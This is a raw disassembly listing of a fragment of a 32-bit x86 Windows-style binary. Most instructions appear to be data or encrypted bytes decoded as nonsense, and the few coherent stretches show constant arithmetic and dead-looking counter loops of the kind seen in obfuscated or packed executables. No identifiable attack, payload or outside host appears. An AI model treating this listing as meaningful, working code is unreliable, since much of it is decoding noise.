  408c3d:	dec    esi
  408c3e:	or     dl,cl
  408c40:	(bad)  
  408c41:	in     al,0x55
  408c43:	jmp    0x39b12dd6
  408c48:	and    BYTE PTR [ebx],bh
  408c4a:	xchg   ecx,eax
  408c4b:	add    al,ch
  408c4d:	gs test eax,0x6994913a
  408c53:	jmp    0x225ab75e
  408c58:	mov    ecx,ecx
  408c5a:	push   esi
  408c5b:	cmp    BYTE PTR [edx-0x72],ah
  408c5e:	cwde   
  408c5f:	and    dl,BYTE PTR ds:0x1936f633
  408c65:	cmp    DWORD PTR [edi+0x1277006c],esp
  408c6b:	xlat   BYTE PTR ds:[ebx]
  408c6c:	les    esp,FWORD PTR [ebp-0x59f45fc7]
  408c72:	mov    ebx,0x1232e840
  408c77:	sub    edi,DWORD PTR [ebx-0x3a020174]
  408c7d:	arpl   WORD PTR [edx-0x2834692d],si
  408c83:	inc    ebp
  408c84:	xchg   esi,eax
  408c85:	sti    
  408c86:	retf   0x8621
  408c89:	clc    
  408c8a:	xor    ecx,DWORD PTR [esi+0x698f48a4]
  408c90:	shr    DWORD PTR [esi+0x34e6b789],cl
  408c96:	jmp    0x408d13
  408c98:	mov    BYTE PTR [edx-0x53deb794],bl
  408c9e:	in     al,dx
  408c9f:	and    ecx,DWORD PTR [ecx]
  408ca1:	xor    al,0xeb
  408ca3:	inc    ebp
  408ca4:	pop    ss
  408ca5:	enter  0xc3c9,0x9e
  408ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408caa:	clc    
  408cab:	or     al,BYTE PTR [eax+0x29894259]
  408cb1:	adc    al,0x30
  408cb3:	and    bh,ah
  408cb5:	repnz retf 
  408cb7:	bswap  ecx
  408cb9:	es dec edx
  408cbb:	test   DWORD PTR [eax],esp
  408cbd:	lahf   
  408cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cbf:	je     0x408cb0
  408cc1:	(bad)  
  408cc3:	ss lock lock pop es
  408cc7:	xchg   ebp,esp
  408cc9:	inc    edx
  408cca:	jnp    0x408c57
  408ccc:	fwait
  408ccd:	aad    0x5a
  408ccf:	retf   0x364f
  408cd2:	mov    edx,0xf9d04319
  408cd7:	(bad)  
  408cd9:	or     ah,bl
  408cdb:	adc    dh,dl
  408cdd:	cmp    esp,DWORD PTR [esi]
  408cdf:	mov    al,ds:0xdd98d0a6
  408ce4:	sbb    BYTE PTR [edi+ecx*1],0xb7
  408ce8:	add    al,0x90
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0x9ca3
  408d20:	gs xchg ebx,eax
  408d22:	mov    bh,BYTE PTR [ecx]
  408d24:	das    
  408d25:	jle    0x408da5
  408d27:	or     bh,BYTE PTR [edi+0x7e]
  408d2a:	jle    0x408d74
  408d2c:	add    al,0x35
  408d2e:	add    bh,BYTE PTR [esi+0xb1043d6]
  408d34:	mov    BYTE PTR [edi],dl
  408d36:	sub    DWORD PTR [edx-0x3a772c22],ebx
  408d3c:	mov    bl,0xdd
  408d3e:	js     0x408dbc
  408d40:	sbb    DWORD PTR [ebx+0x1c8d1b5f],ecx
  408d46:	out    0x6a,eax
  408d48:	mov    fs,eax
  408d4a:	and    al,bl
  408d4c:	or     ch,BYTE PTR [ebp-0x5cda902e]
  408d52:	pop    ebx
  408d53:	mov    bh,al
  408d55:	cmp    ah,al
  408d57:	adc    DWORD PTR [edx],esi
  408d59:	jbe    0x408d27
  408d5b:	jmp    0xae82:0xe8f7b769
  408d62:	dec    edi
  408d63:	mov    ah,0x59
  408d65:	pop    esp
  408d66:	int    0xdf
  408d68:	stc    
  408d69:	mov    WORD PTR [edi],?
  408d6b:	add    eax,0x63242439
  408d70:	xchg   DWORD PTR [ebx],eax
  408d72:	ss mov edi,0xadafb49c
  408d78:	lahf   
  408d79:	add    DWORD PTR [ebx+0x609c6d37],eax
  408d7f:	mov    esi,0x81b143da
  408d84:	(bad)  
  408d85:	das    
  408d86:	mov    al,ds:0xe6003167
  408d8b:	fldl2e 
  408d8d:	fimul  DWORD PTR [esp+esi*4-0x45]
  408d91:	int    0x22
  408d93:	push   esi
  408d94:	or     ah,BYTE PTR [ebx]
  408d96:	sub    bh,cl
  408d98:	mov    ebx,0x7f1955e6
  408d9d:	scas   al,BYTE PTR es:[edi]
  408d9e:	dec    ecx
  408d9f:	shl    DWORD PTR [edx-0x469e7997],1
  408da5:	jns    0x408d62
  408da7:	sbb    BYTE PTR [edi-0x742bce2f],0x69
  408dae:	push   ecx
  408daf:	xor    ah,BYTE PTR [edx+0x25]
  408db2:	rcl    DWORD PTR [edi],0xd7
  408db5:	out    0x9d,al
  408db7:	fwait
  408db8:	mov    bl,0xb9
  408dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dbb:	sub    ebx,DWORD PTR [ebp-0x6d88e17e]
  408dc1:	pusha  
  408dc2:	hlt    
  408dc3:	jge    0x408d54
  408dc5:	mov    bl,0x93
  408dc7:	popf   
  408dc8:	cmp    dl,dh
  408dca:	imul   esi,ebp,0x2421c32
  408dd0:	jmp    0x36e5:0x3b4a7f37
  408dd7:	ja     0x408de6
  408dd9:	rcr    dl,0xb
  408ddc:	hlt    
  408ddd:	lods   al,BYTE PTR ds:[esi]
  408dde:	sbb    edi,DWORD PTR [ebx+0x457088c6]
  408de4:	mov    cl,BYTE PTR [esi+0x60]
  408de7:	outs   dx,DWORD PTR ds:[esi]
  408de8:	push   edi
  408de9:	outs   dx,BYTE PTR ds:[esi]
  408dea:	outs   dx,BYTE PTR ds:[esi]
  408deb:	xchg   ch,dh
  408ded:	xchg   edi,eax
  408dee:	or     DWORD PTR [ecx+0x7df7d88f],esi
  408df4:	mov    ebp,0x35d0c3e7
  408df9:	dec    eax
  408dfa:	dec    ebx
  408dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dfc:	inc    edi
  408dfd:	pop    esp
  408dfe:	add    edx,DWORD PTR [ecx]
  408e00:	push   es
  408e01:	jge    0x408db7
  408e03:	cli    
  408e04:	pop    ds
  408e05:	pop    ecx
  408e06:	push   esp
  408e07:	lods   al,BYTE PTR ds:[esi]
  408e08:	in     al,dx
  408e09:	mov    ebx,DWORD PTR [ecx]
  408e0b:	adc    eax,esi
  408e0d:	es mov dh,0x1b
  408e10:	mov    eax,0x3f62e4b0
  408e15:	aam    0x4f
  408e17:	sub    dh,bl
  408e19:	frstor [edx+0x270b61d9]
  408e1f:	xor    eax,0x90136da5
  408e24:	dec    ebp
  408e25:	push   cs
  408e26:	out    0xb3,eax
  408e28:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e2a:	xlat   BYTE PTR ds:[ebx]
  408e2b:	mov    ah,0x86
  408e2d:	js     0x408e57
  408e2f:	rcr    cl,cl
  408e31:	aas    
  408e32:	xor    al,0xdd
  408e34:	sub    bh,ah
  408e36:	mov    es,WORD PTR [ebx]
  408e38:	(bad)  
  408e39:	mov    DWORD PTR [edx],eax
  408e3b:	jmp    0x408f64
  408e40:	dec    eax
  408e41:	sub    ecx,DWORD PTR [edx]
  408e43:	lock imul edx,DWORD PTR [ecx+0x1c4aeb48],0x4655de2b
  408e4e:	pop    ebp
  408e4f:	jb     0x408e86
  408e51:	sub    al,0x7e
  408e53:	jle    0x408e5f
  408e55:	jg     0x408ed5
  408e57:	jle    0x408e76
  408e59:	push   ebp
  408e5a:	in     al,dx
  408e5b:	pushf  
  408e5c:	clc    
  408e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e5e:	retf   
  408e5f:	lds    edx,FWORD PTR [edx+0x34784e8]
  408e65:	ss fwait
  408e67:	mov    eax,ds:0x24ca22c8
  408e6c:	and    al,0x25
  408e6e:	lea    esp,[ebx]
  408e70:	sub    DWORD PTR [eax+0x23],edi
  408e73:	div    BYTE PTR [ebp-0x3e445fec]
  408e79:	xor    ebp,DWORD PTR [esi-0x694d993f]
  408e7f:	add    BYTE PTR [edi-0xe],ch
  408e82:	and    DWORD PTR [eax-0x5af10838],0xc42403c5
  408e8c:	xlat   BYTE PTR ds:[ebx]
  408e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e8e:	and    dl,BYTE PTR [ebp+esi*8+0x7b]
  408e92:	out    dx,al
  408e93:	add    bl,BYTE PTR [ebx+0x6f]
  408e96:	mov    cl,0x48
  408e98:	loop   0x408ee0
  408e9a:	mov    ch,0x7e
  408e9c:	fwait
  408e9d:	pop    esp
  408e9e:	dec    esp
  408e9f:	mov    BYTE PTR [ecx],bl
  408ea1:	rcr    DWORD PTR [edi-0x2ff0b6cf],cl
  408ea7:	scas   al,BYTE PTR es:[edi]
  408ea8:	add    esi,DWORD PTR [esi]
  408eaa:	test   edi,edi
  408eac:	mov    DWORD PTR [edx+0x7cf0fff],ebx
  408eb2:	adc    DWORD PTR [edi],esi
  408eb4:	add    DWORD PTR [esi+0x39],0xfffffff0
  408eb8:	int3   
  408eb9:	cmp    ecx,edx
  408ebb:	xor    DWORD PTR [ebp-0x2b],ecx
  408ebe:	xchg   ecx,eax
  408ebf:	pop    eax
  408ec0:	xor    al,0xbc
  408ec2:	xor    BYTE PTR [eax+0x5f],al
  408ec5:	mov    ebx,0x18202bd6
  408eca:	jl     0x408f4a
  408ecc:	mov    ebp,DWORD PTR [esi+edi*4-0x45]
  408ed0:	mov    dh,BYTE PTR [esi-0x49f69036]
  408ed6:	retf   0x36d1
  408ed9:	pusha  
  408eda:	push   DWORD PTR [esi]
  408edc:	cmp    esp,edx
  408ede:	retf   
  408edf:	lds    ecx,FWORD PTR [ebp+0x329fe075]
  408ee5:	or     esp,edi
  408ee7:	pop    eax
  408ee8:	(bad)  
  408ee9:	enter  0x3b4c,0x81
  408eed:	test   BYTE PTR [eax+0x7c09b958],al
  408ef3:	out    0xf3,al
  408ef5:	jnp    0x408f3c
  408ef7:	xor    DWORD PTR [edi+eiz*1],esp
  408efa:	push   esi
  408efb:	ret    
  408efc:	cwde   
  408efd:	mov    ?,WORD PTR [eax]
  408eff:	cmc    
  408f00:	stos   DWORD PTR es:[edi],eax
  408f01:	ins    BYTE PTR es:[edi],dx
  408f02:	adc    eax,0x9cc68456
  408f07:	dec    edi
  408f08:	xchg   edx,eax
  408f09:	mov    ds:0xf8f193b,al
  408f0e:	bound  esp,QWORD PTR [edi]
  408f10:	fwait
  408f11:	push   ebp
  408f12:	jbe    0x408f0e
  408f14:	add    BYTE PTR [ebx-0xb],cl
  408f17:	pop    ds
  408f18:	ins    BYTE PTR es:[edi],dx
  408f19:	jp     0x408edd
  408f1b:	mov    ecx,esi
  408f1d:	ins    DWORD PTR es:[edi],dx
  408f1e:	out    dx,eax
  408f1f:	ins    BYTE PTR es:[edi],dx
  408f20:	cmp    ah,BYTE PTR [edx*8-0x7198cd5e]
  408f27:	popf   
  408f28:	and    eax,0x3642e83
  408f2d:	cld    
  408f2e:	stos   BYTE PTR es:[edi],al
  408f2f:	mov    cl,bh
  408f31:	call   0x8ee5c0c8
  408f36:	adc    eax,esi
  408f38:	adc    eax,ebp
  408f3a:	lock (bad) 
  408f3c:	aam    0x9e
  408f3e:	scas   al,BYTE PTR es:[edi]
  408f3f:	jle    0x408f4b
  408f41:	iret   
  408f42:	cmp    al,0xec
  408f44:	jnp    0x408f9a
  408f46:	fldenv [edx+esi*8]
  408f49:	scas   al,BYTE PTR es:[edi]
  408f4a:	sbb    al,0x99
  408f4c:	and    al,0x1a
  408f4e:	mul    BYTE PTR [ebx+esi*2]
  408f51:	adc    edx,DWORD PTR [esi-0x2]
  408f54:	cmp    al,0x7e
  408f56:	test   eax,0xc1a2982d
  408f5b:	in     al,0x2b
  408f5d:	mov    dl,BYTE PTR [edi]
  408f5f:	sbb    BYTE PTR [ebp-0x74ea69d5],0x45
  408f66:	clc    
  408f67:	xor    eax,ecx
  408f69:	add    eax,esi
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0x1416b935
  408fab:	xchg   ebp,eax
  408fac:	jp     0x408f6f
  408fae:	sub    eax,0x7f0a7e7e
  408fb3:	jle    0x409033
  408fb5:	xor    eax,0x47d9a42b
  408fba:	sbb    eax,0xc8dea9cf
  408fbf:	add    al,0x7c
  408fc1:	les    esi,FWORD PTR [ebx-0x4996dc24]
  408fc7:	(bad)  [ebp-0x20]
  408fca:	pop    ecx
  408fcb:	sub    ebx,ebx
  408fcd:	outs   dx,DWORD PTR ds:[esi]
  408fce:	cwde   
  408fcf:	xchg   esi,eax
  408fd0:	inc    eax
  408fd1:	mov    edi,DWORD PTR [eax]
  408fd3:	cmovge esi,DWORD PTR [edi+0x0]
  408fd7:	cmp    edx,DWORD PTR [esi+esi*8]
  408fda:	xlat   BYTE PTR ds:[ebx]
  408fdb:	dec    ebx
  408fdc:	gs inc esi
  408fde:	xor    dl,BYTE PTR [edi+esi*1+0x223a0c3c]
  408fe5:	iret   
  408fe6:	pop    esp
  408fe7:	fldenv [eax-0xd]
  408fea:	adc    esp,eax
  408fec:	mov    ds:0xaf1351a5,al
  408ff1:	cld    
  408ff2:	into   
  408ff3:	loop   0x409050
  408ff5:	iret   
  408ff6:	mov    esi,0xac57533c
  408ffb:	mov    esp,0x9705c5d5
  409000:	adc    BYTE PTR [ebp*8+0x145cee25],bh
  409007:	cmp    bh,BYTE PTR [ecx+eiz*4-0x38]
  40900b:	dec    ebp
  40900c:	push   ecx
  40900d:	add    eax,0x2194469b
  409012:	jmp    0x880aa2e9
  409017:	add    BYTE PTR [ecx-0x17],bh
  40901a:	push   ebx
  40901b:	inc    ebx
  40901c:	in     al,dx
  40901d:	lahf   
  40901e:	outs   dx,BYTE PTR ds:[esi]
  40901f:	mov    ds:0xe180ce85,al
  409024:	push   eax
  409025:	or     esp,DWORD PTR [ecx]
  409027:	lods   al,BYTE PTR ds:[esi]
  409028:	cmc    
  409029:	dec    edx
  40902a:	jo     0x408fbf
  40902c:	cmp    DWORD PTR [ecx],esp
  40902e:	mov    edi,0xea09c7f8
  409033:	push   esi
  409034:	cdq    
  409035:	cmp    eax,0x5875f855
  40903a:	ss in  al,0xf7
  40903d:	and    BYTE PTR [eax-0xc],bl
  409040:	cli    
  409041:	jge    0x408ff3
  409043:	cmp    eax,DWORD PTR [edi-0x3d00fcc6]
  409049:	xor    eax,0xb28005bd
  40904e:	test   eax,0x14fc7881
  409053:	cli    
  409054:	es inc ecx
  409056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409057:	aam    0x7a
  409059:	in     al,0x5f
  40905b:	pop    eax
  40905c:	jns    0x409047
  40905e:	scas   eax,DWORD PTR es:[edi]
  40905f:	fst    QWORD PTR [esi+0x14]
  409062:	int3   
  409063:	jge    0x409062
  409065:	popf   
  409066:	imul   esp,DWORD PTR [edx+esi*2+0x5e],0x5a
  40906b:	es xchg ecx,eax
  40906d:	fs fwait
  40906f:	jecxz  0x40905d
  409071:	rol    DWORD PTR [eax-0x37],1
  409074:	mov    BYTE PTR [edx-0x5aee67ae],0x82
  40907b:	in     eax,dx
  40907c:	jl     0x409002
  40907e:	rcl    BYTE PTR [ebx+0x58000132],0xc2
  409085:	fdivr  QWORD PTR ds:0xe3b10167
  40908b:	fcomp  DWORD PTR [edi+0x7b949368]
  409091:	in     al,0xdf
  409093:	push   ecx
  409094:	cmp    ebx,ecx
  409096:	stc    
  409097:	mov    dh,0x5d
  409099:	pop    ss
  40909a:	push   esp
  40909b:	imul   esi,esi,0x29f415e8
  4090a1:	mov    al,0x46
  4090a3:	or     eax,0xa176eac6
  4090a8:	dec    ecx
  4090a9:	xchg   esp,eax
  4090aa:	jb     0x40907b
  4090ac:	je     0x409096
  4090ae:	lahf   
  4090af:	ss push esi
  4090b1:	rcr    DWORD PTR [edi+0x3],cl
  4090b4:	xchg   esi,eax
  4090b5:	push   es
  4090b6:	pop    eax
  4090b7:	sbb    esi,ebx
  4090b9:	mov    dl,0xcd
  4090bb:	jg     0x409067
  4090bd:	jb     0x409130
  4090bf:	retf   0xff1
  4090c2:	mov    esi,0x3c13312
  4090c7:	(bad)  
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	popf   
  4090fb:	(bad)  [ecx+esi*2-0x23]
  4090ff:	and    bh,BYTE PTR [esi+0x7e]
  409102:	or     bh,BYTE PTR [edi+0x7e]
  409105:	jle    0x409109
  409107:	jno    0x40910a
  409109:	mov    ds:0x2d184b8d,al
  40910e:	jmp    0xe54d:0xc30c1fce
  409115:	add    ebx,ebp
  409117:	xchg   bh,bh
  409119:	popa   
  40911a:	push   es
  40911b:	cmp    eax,0x3681e2d9
  409120:	je     0x409126
  409122:	popa   
  409123:	sbb    DWORD PTR [esi+0x1c],edi
  409126:	out    0x17,eax
  409128:	outs   dx,DWORD PTR ds:[esi]
  409129:	idiv   ecx
  40912b:	inc    eax
  40912c:	push   cs
  40912d:	xor    eax,0xe3ea3f0e
  409132:	mov    edx,0xcad73cf
  409137:	mov    ebp,0x8fc7d20e
  40913c:	jae    0x40917e
  40913e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40913f:	mov    ah,0x4d
  409141:	popa   
  409142:	mov    ebx,ebx
  409144:	mov    bh,0x78
  409146:	cdq    
  409147:	inc    esp
  409148:	xchg   edi,eax
  409149:	mov    eax,0x3e5bc8d9
  40914e:	cdq    
  40914f:	xor    al,0x3b
  409151:	pop    edi
  409152:	mov    eax,DWORD PTR [esi+0x2b]
  409155:	and    al,0x35
  409157:	dec    ecx
  409158:	add    DWORD PTR [ecx+0x31],edx
  40915b:	mov    edx,0xa277e056
  409160:	mov    al,0xb4
  409162:	mov    cl,0xc4
  409164:	aam    0x25
  409166:	out    dx,eax
  409167:	xor    dl,0xc0
  40916a:	mov    eax,0x86fe01f1
  40916f:	jmp    0xbe294de2
  409174:	add    ch,dl
  409176:	xor    al,0x9b
  409178:	fst    DWORD PTR [ecx+ebx*1+0x76]
  40917c:	pop    esi
  40917d:	pusha  
  40917e:	or     al,0xbb
  409180:	jb     0x40914d
  409182:	xor    bh,BYTE PTR [eax+edi*2-0x7afe6872]
  409189:	adc    al,0x4
  40918b:	nop
  40918c:	mov    eax,0xaa65c6ad
  409191:	push   ebp
  409192:	sbb    eax,0xc5fc7982
  409197:	sub    esi,DWORD PTR [edx-0x24]
  40919a:	adc    DWORD PTR [esi],0x162d87e4
  4091a0:	aad    0x49
  4091a2:	mov    ebp,0xfcf587ae
  4091a7:	ds (bad) 
  4091a9:	pop    ss
  4091aa:	jnp    0x4091af
  4091ac:	mov    al,0x86
  4091ae:	adc    eax,0x98a5cb97
  4091b3:	test   BYTE PTR [edi],dl
  4091b5:	inc    ebp
  4091b6:	sub    ecx,DWORD PTR [ecx+esi*4]
  4091b9:	out    dx,eax
  4091ba:	sbb    DWORD PTR [esi+ebp*1],ebp
  4091bd:	out    dx,eax
  4091be:	mov    cl,0x98
  4091c0:	and    BYTE PTR [esi],0xe3
  4091c3:	xchg   ecx,eax
  4091c4:	jl     0x409217
  4091c6:	sar    BYTE PTR [ebx-0x3038f113],0x60
  4091cd:	push   0x35
  4091cf:	add    BYTE PTR [ebx+0x63],bl
  4091d2:	je     0x4091fd
  4091d4:	es jbe 0x4091a8
  4091d7:	lock mov edi,cs
  4091da:	pop    esi
  4091db:	loop   0x40921d
  4091dd:	lock xor BYTE PTR [ebx],ah
  4091e0:	pop    ecx
  4091e1:	pop    ebx
  4091e2:	idiv   ah
  4091e4:	repnz mov ?,WORD PTR [eax+edi*1+0x70]
  4091e9:	pop    es
  4091ea:	jp     0x4091c3
  4091ec:	fisttp QWORD PTR [ebx-0x19]
  4091ef:	sbb    al,ah
  4091f1:	jmp    0xa628:0x94e3f9c7
  4091f8:	das    
  4091f9:	sbb    eax,0xe3956b45
  4091fe:	jae    0x409186
  409200:	add    ch,BYTE PTR ds:0xdf472742
  409206:	mov    ?,WORD PTR [ebx+edi*4]
  409209:	fimul  WORD PTR [ebx+0x3623a829]
  40920f:	(bad)  
  409211:	out    0x8b,al
  409213:	push   ebp
  409214:	or     BYTE PTR [ebx],dh
  409216:	ror    DWORD PTR [ebp+0x729f1084],0x32
  40921d:	add    BYTE PTR [ecx+0x45ff0845],cl
  409223:	or     al,0xe9
  409225:	inc    ebp
  409226:	std    
  409227:	(bad)  
  409228:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx-0x75785839]
  409240:	jecxz  0x409232
  409242:	cwde   
  409243:	jmp    0xabf106b
  409248:	jg     0x4092c8
  40924a:	jle    0x409242
  40924c:	pop    esp
  40924d:	xchg   ebp,eax
  40924e:	pop    esp
  40924f:	inc    esi
  409250:	or     BYTE PTR [edi],al
  409252:	cmp    ch,ah
  409254:	or     eax,0x36a0a8be
  409259:	mov    ch,0x4
  40925b:	jmp    0x409299
  40925d:	xor    BYTE PTR [ecx+esi*4+0x45],0xe1
  409262:	aam    0xe6
  409264:	mov    bh,0x74
  409266:	cmc    
  409267:	push   esi
  409268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409269:	aad    0x1a
  40926b:	shr    DWORD PTR [ebx+0x39],1
  40926e:	jp     0x409277
  409270:	arpl   dx,bx
  409272:	xor    eax,0x80531382
  409277:	mov    eax,0xa57b383d
  40927c:	pop    ds
  40927d:	rcr    DWORD PTR [edx-0x51],cl
  409280:	scas   al,BYTE PTR es:[edi]
  409281:	rol    DWORD PTR [edx-0x20],cl
  409284:	sbb    ah,0xe1
  409287:	xchg   edx,eax
  409288:	mov    eax,ds:0xd98d4bec
  40928d:	inc    eax
  40928e:	clc    
  40928f:	sub    BYTE PTR [esi-0x58],ch
  409292:	jo     0x4092fd
  409294:	int    0x9b
  409296:	hlt    
  409297:	add    DWORD PTR [esi-0xc],0xc086845a
  40929e:	fild   DWORD PTR [eax+0x8]
  4092a1:	test   DWORD PTR [edi],edx
  4092a3:	std    
  4092a4:	fldenv ds:0x33024bd5
  4092aa:	push   ds
  4092ab:	pop    ds
  4092ac:	pop    ds
  4092ad:	mov    edi,0xb27b9923
  4092b2:	mov    al,0xea
  4092b4:	sti    
  4092b5:	fild   QWORD PTR [ebx+0x4a]
  4092b8:	sub    ebp,DWORD PTR [esi]
  4092ba:	call   0x6e94:0xb22237de
  4092c1:	xchg   edi,eax
  4092c2:	inc    ecx
  4092c3:	fld    QWORD PTR [ecx]
  4092c5:	sbb    eax,0x1a5dc024
  4092ca:	lods   al,BYTE PTR ds:[esi]
  4092cb:	cwde   
  4092cc:	xchg   ebp,eax
  4092cd:	mov    ebx,0xfd97c114
  4092d2:	jmp    0x51a5d88b
  4092d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092d8:	in     eax,0x5d
  4092da:	cmp    BYTE PTR [ecx+0x30],bl
  4092dd:	sbb    esi,DWORD PTR [eax-0xd]
  4092e0:	lods   al,BYTE PTR ds:[esi]
  4092e1:	fld    QWORD PTR [ebx+0x16704f4b]
  4092e7:	add    BYTE PTR [ebp+0x1ec79574],bl
  4092ed:	jp     0x409270
  4092ef:	lods   eax,DWORD PTR ds:[esi]
  4092f0:	pop    esi
  4092f1:	inc    esi
  4092f2:	daa    
  4092f3:	jne    0x409342
  4092f5:	into   
  4092f6:	outs   dx,DWORD PTR ds:[esi]
  4092f7:	lahf   
  4092f8:	dec    edx
  4092f9:	pop    es
  4092fa:	inc    ecx
  4092fb:	pop    edx
  4092fc:	sbb    BYTE PTR [eax-0xbb6ca40],bl
  409302:	cmp    dl,BYTE PTR [eax+0x4d]
  409305:	rcr    eax,1
  409307:	and    DWORD PTR [ecx],esp
  409309:	(bad)  
  40930a:	loop   0x4092dd
  40930c:	into   
  40930d:	xor    BYTE PTR [edi],bh
  40930f:	mov    eax,ds:0x9ce60fec
  409314:	pop    ebp
  409315:	loopne 0x40937e
  409317:	push   0xffffffac
  409319:	fs shl dh,1
  40931c:	jmp    0x40933f
  40931e:	ror    BYTE PTR [edx],1
  409320:	loop   0x4092b3
  409322:	dec    edx
  409323:	or     BYTE PTR [eax],0xcd
  409326:	jns    0x4092cd
  409328:	and    BYTE PTR [eax+0x75],0xa
  40932c:	push   cs
  40932d:	mov    DWORD PTR [eax-0x42],ebp
  409330:	fimul  WORD PTR [ecx]
  409332:	push   0x22
  409334:	jbe    0x4092e1
  409336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409337:	push   0xffffff9d
  409339:	xor    dl,dl
  40933b:	jne    0x409319
  40933d:	ret    0x514b
  409340:	jne    0x409389
  409342:	lods   eax,DWORD PTR ds:[esi]
  409343:	scas   al,BYTE PTR es:[edi]
  409344:	push   eax
  409345:	outs   dx,DWORD PTR ds:[esi]
  409346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409347:	sub    edi,DWORD PTR [ebx]
  409349:	sub    esp,eax
  40934b:	imul   eax,DWORD PTR [edx],0x988ea6d8
  409351:	stos   DWORD PTR es:[edi],eax
  409352:	inc    esi
  409353:	cld    
  409354:	(bad)  
  409355:	bound  ecx,QWORD PTR [bp+di+0x104d]
  40935a:	add    eax,esi
  40935c:	mov    DWORD PTR [ecx],eax
  40935e:	pop    esi
  40935f:	leave  
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4245c6,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x41235c,0x4245c6
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x412368,0x417e41
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4245be,0x0
  4093ab:	jmp    0x4093bd
  4093b0:	mov    edx,DWORD PTR ds:0x4245be
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4245be,edx
  4093bd:	cmp    DWORD PTR ds:0x4245be,0x14
  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4245be,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41237c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x412360
  4093f3:	push   esi
  4093f4:	add    esi,edx
  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41abda,0x417e49
  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412398
  409412:	mov    esi,DWORD PTR ds:0x421896
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
  409420:	mov    esi,DWORD PTR [ebp+0x10]
  409423:	mov    DWORD PTR [esi+0x8],eax
  409426:	mov    DWORD PTR ds:0x412368,0x19
  409430:	cmp    DWORD PTR ds:0x412368,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x412368,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x412368
